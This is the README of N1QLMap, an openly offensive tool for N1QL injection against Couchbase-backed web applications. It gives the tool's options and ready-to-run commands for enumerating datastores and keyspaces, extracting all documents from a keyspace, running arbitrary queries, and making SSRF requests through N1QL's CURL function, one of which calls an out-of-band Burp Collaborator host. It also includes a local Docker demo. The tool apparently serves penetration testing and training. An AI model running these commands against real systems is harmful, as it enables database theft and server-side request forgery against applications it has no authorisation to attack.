# Description

`N1QLMap` is an N1QL exploitation tool. Currently works with Couchbase database. The tool supports data extraction and performing SSRF attacks via CURL.

# Usage 

## Help

```
usage: n1qlMap.py [-h] [-r REQUEST] [-k KEYWORD] [--proxy PROXY] [--validatecerts] [-v]
                  (-d | -ks DATASTORE_URL | -e KEYSPACE_ID | -q QUERY | -c [ENDPOINT [OPTIONS ...]])
                  host

positional arguments:
  host                  Host used to send an HTTP request e.g. https://vulndomain.net

optional arguments:
  -h, --help            show this help message and exit
  -r REQUEST, --request REQUEST
                        Path to an HTTP request
  -k KEYWORD, --keyword KEYWORD
                        Keyword that exists in HTTP response when query is successful
  --proxy PROXY         Proxy server address
  --validatecerts       Set the flag to enforce certificate validation. Certificates are not validated by default!
  -v, --verbose_debug   Set the verbosity level to debug
  -d, --datastores      Lists available datastores
  -ks DATASTORE_URL, --keyspaces DATASTORE_URL
                        Lists available keyspaces for specific datastore URL
  -e KEYSPACE_ID, --extract KEYSPACE_ID
                        Extracts data from a specific keyspace
  -q QUERY, --query QUERY
                        Run arbitrary N1QL query
  -c [ENDPOINT [OPTIONS ...]], --curl [ENDPOINT [OPTIONS ...]]
                        Runs CURL N1QL function inside the query, can be used to SSRF
```
## Usage

1. Put an HTTP request to `request.txt` file. Mark an injection point using `*i*`. See `example_request_1.txt` file for a reference.
2. Use one the following commands.

Extracts datastores:
```sh
$ ./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --datastores
```

Extracts keyspaces from the specific datastore ID:
```sh
$ ./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --keyspaces "http://127.0.0.1:8091"
```

Extracts all documents from the given keyspace:
```sh
$ ./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --extract travel-sample
```

Run arbitrary query:
```sh
$ ./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --query 'SELECT * FROM `travel-sample` AS T ORDER by META(T).id LIMIT 1'
```

Perform CURL request / SSRF:
```sh
$ ./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --curl *************j3mrt7xy3pre.burpcollaborator.net "{'request':'POST','data':'data','header':['User-Agent: Agent Smith']}"
```

# Demo

To play with the vulnerability you can spin Docker machines with Couchbase and NodeJS web application. If you already met the Requirements, just run the:

```sh
cd n1ql-demo
./quick_setup.sh
```

Now, you can run command described in `Usage` section against Dockerised web application.



# Requirements

`N1QLMap.py` script doesn't need any specific requirements apart of Python 3.

The following requirements are only for Demo provided in `n1ql-demo` directory.

* Docker
* Docker Compose

To install Docker and Docker Compose on Kali:
```sh
# Docker Installation
curl -fsSL https://download.docker.com/linux/debian/gpg | apt-key add -
echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' > /etc/apt/sources.list.d/docker.list
apt-get update

apt-get remove docker docker-engine docker.io
apt-get install docker-ce

# Start Docker Service
systemctl start docker

# Docker Compose Installation
sudo curl -L "https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
```

Let's test Docker:
```sh
docker run hello-world
```
